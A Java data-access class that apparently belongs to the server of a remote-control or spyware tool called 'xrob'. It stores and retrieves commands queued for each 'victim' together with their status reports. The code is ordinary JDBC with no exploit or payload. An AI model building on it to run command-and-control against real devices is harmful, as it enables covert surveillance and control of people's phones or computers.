package com.theah64.xrob.api.database.tables.command;

import com.theah64.xrob.api.database.Connection;
import com.theah64.xrob.api.database.tables.BaseTable;
import com.theah64.xrob.api.models.Command;

import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by theapache64 on 14/9/16,4:37 PM.
 */
public class Commands extends BaseTable<Command> {

    public static final String COLUMN_COMMAND = "command";
    private static final String COLUMN_AS_COMMAND_ESTABLISHED_AT = "command_established_at";
    private static final String COLUMN_AS_COMMAND_STATUSES = "command_statuses";
    private static final String COLUMN_AS_COMMAND_STATUS_MESSAGES = "command_status_messages";
    private static final String COLUMN_AS_COMMAND_STATUSES_REPORTED_AT = "command_statuses_reported_at";
    private static final String COLUMN_AS_COMMAND_STATUSES_HAPPENED_AT = "command_statuses_happened_at";
    public static final String COLUMN_VICTIM_ID = "victim_id";
    public static final String TABLE_NAME_COMMANDS = "commands";

    private Commands() {
        super(TABLE_NAME_COMMANDS);
    }

    private static final Commands instance = new Commands();

    public static Commands getInstance() {
        return instance;
    }

    @Override
    public List<Command> getAll(String clientId, String victimId) {

        List<Command> commands = null;

        final String query = "SELECT c.id,c.command, UNIX_TIMESTAMP(c.last_logged_at) AS command_established_at FROM commands c INNER JOIN command_statuses cs ON cs.command_id = c.id WHERE c.client_id=? AND c.victim_id=? GROUP BY c.id ORDER BY c.id DESC;";

        final java.sql.Connection con = Connection.getConnection();
        try {
            final PreparedStatement ps = con.prepareStatement(query);
            ps.setString(1, clientId);
            ps.setString(2, victimId);
            final ResultSet rs = ps.executeQuery();
            if (rs.first()) {
                commands = new ArrayList<>();
                do {
                    final String id = rs.getString(COLUMN_ID);
                    final String command = rs.getString(COLUMN_COMMAND);
                    final long commandEstablishedAt = rs.getLong(COLUMN_AS_COMMAND_ESTABLISHED_AT);


                    final List<Command.Status> commandStatuses = CommandStatuses.getInstance().getAll(CommandStatuses.COLUMN_COMMAND_ID, id);


                    commands.add(new Command(id, command, commandEstablishedAt, commandStatuses, null, null));

                } while (rs.next());
            }
            rs.close();
            ps.close();
        } catch (SQLException e) {
            e.printStackTrace();
            try {

                con.close();
            } catch (SQLException e1) {
                e1.printStackTrace();
            }
        }
        return commands;
    }

    @Override
    public String addv3(Command command) {
        String commandId = null;
        final String addCommandQuery = "INSERT INTO commands (command,client_id,victim_id) VALUES (?,?,?);";
        System.out.println(String.format("INSERT INTO commands (command,client_id,victim_id) VALUES ('%s','%s','%s');", command.getCommand(), command.getClientId(), command.getVictimId()));
        final java.sql.Connection con = Connection.getConnection();

        //To track the success
        try {
            final PreparedStatement ps = con.prepareStatement(addCommandQuery, PreparedStatement.RETURN_GENERATED_KEYS);

            ps.setString(1, command.getCommand());
            ps.setString(2, command.getClientId());
            ps.setString(3, command.getVictimId());

            if (ps.executeUpdate() == 1) {
                final ResultSet rs = ps.getGeneratedKeys();
                if (rs.first()) {
                    commandId = rs.getString(1);
                }
                rs.close();
            }


            ps.close();

        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }

        return commandId;
    }
}
